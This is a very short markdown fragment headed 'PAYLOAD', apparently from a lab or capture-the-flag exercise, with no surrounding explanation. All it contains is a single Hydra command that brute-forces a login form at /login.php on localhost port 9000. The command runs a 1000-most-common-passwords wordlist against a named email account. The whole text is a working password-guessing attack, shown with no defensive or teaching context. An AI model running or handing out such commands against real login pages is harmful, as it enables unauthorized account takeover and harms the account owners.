## PAYLOAD

> ### hydra -l sict.ccsclub@gmail.com -P 1000-most-common-passwords.txt -s 9000 localhost http-post-form "/login.php:email=sict.ccsclub@gmail.com&pass=^PASS^:F=error"